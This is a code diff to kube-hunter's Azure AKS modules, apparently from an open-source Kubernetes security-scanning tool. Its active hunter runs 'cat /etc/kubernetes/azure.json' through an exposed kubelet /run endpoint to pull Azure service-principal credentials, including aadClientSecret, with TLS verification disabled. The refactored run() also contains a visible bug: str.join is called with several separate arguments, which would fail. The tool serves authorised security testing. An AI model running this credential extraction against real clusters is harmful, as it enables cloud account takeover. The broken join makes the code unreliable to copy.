@@ -2,6 +2,7 @@ import json
 import logging
 import requests
 
+from kube_hunter.conf import config
 from kube_hunter.modules.hunting.kubelet import ExposedRunHandler
 from kube_hunter.core.events import handler
 from kube_hunter.core.events.types import Event, Vulnerability
@@ -17,22 +18,25 @@ class AzureSpnExposure(Vulnerability, Event):
         self.container = container
 
 
-@handler.subscribe(ExposedRunHandler, predicate=lambda x: x.cloud=="Azure")
+@handler.subscribe(ExposedRunHandler, predicate=lambda x: x.cloud == "Azure")
 class AzureSpnHunter(Hunter):
     """AKS Hunting
     Hunting Azure cluster deployments using specific known configurations
     """
     def __init__(self, event):
         self.event = event
-        self.base_url = "https://{}:{}".format(self.event.host, self.event.port)
+        self.base_url = f"https://{self.event.host}:{self.event.port}"
 
     # getting a container that has access to the azure.json file
     def get_key_container(self):
-        logger.debug("Passive Hunter is attempting to "
-                     "find container with access to azure.json file")
-        raw_pods = requests.get(self.base_url + "/pods", verify=False).text
-        if "items" in raw_pods:
-            pods_data = json.loads(raw_pods)["items"]
+        endpoint = f"{self.base_url}/pods"
+        logger.debug("Passive Hunter is attempting to find container with access to azure.json file")
+        try:
+            r = requests.get(endpoint, verify=False, timeout=config.network_timeout)
+        except requests.Timeout:
+            logger.debug("failed getting pod info")
+        else:
+            pods_data = r.json().get("items", [])
             for pod_data in pods_data:
                 for container in pod_data["spec"]["containers"]:
                     for mount in container["volumeMounts"]:
@@ -61,19 +65,28 @@ class ProveAzureSpnExposure(ActiveHunter):
         self.base_url = f"https://{self.event.host}:{self.event.port}"
 
     def run(self, command, container):
-        run_url = f"{self.base_url}/run/" \
-                  f"{container['namespace']}/" \
-                  f"{container['pod']}/" \
-                  f"{container['name']}"
-        return requests.post(run_url, verify=False, params={'cmd': command}).text
+        run_url = "/".join(
+            self.base_url,
+            "run",
+            container["namespace"],
+            container["pod"],
+            container["name"])
+        return requests.post(
+            run_url,
+            verify=False,
+            params={'cmd': command},
+            timeout=config.network_timeout)
 
     def execute(self):
-        raw_output = self.run("cat /etc/kubernetes/azure.json",
-                              container=self.event.container)
-        if "subscriptionId" in raw_output:
-            subscription = json.loads(raw_output)
-            self.event.subscriptionId = subscription["subscriptionId"]
-            self.event.aadClientId = subscription["aadClientId"]
-            self.event.aadClientSecret = subscription["aadClientSecret"]
-            self.event.tenantId = subscription["tenantId"]
-            self.event.evidence = f"subscription: {self.event.subscriptionId}"
+        try:
+            r = self.run("cat /etc/kubernetes/azure.json", container=self.event.container)
+        except requests.Timeout:
+            logger.debug("failed to run command in container", exc_info=True)
+        else:
+            subscription = r.json()
+            if "subscriptionId" in subscription:
+                self.event.subscriptionId = subscription["subscriptionId"]
+                self.event.aadClientId = subscription["aadClientId"]
+                self.event.aadClientSecret = subscription["aadClientSecret"]
+                self.event.tenantId = subscription["tenantId"]
+                self.event.evidence = f"subscription: {self.event.subscriptionId}"
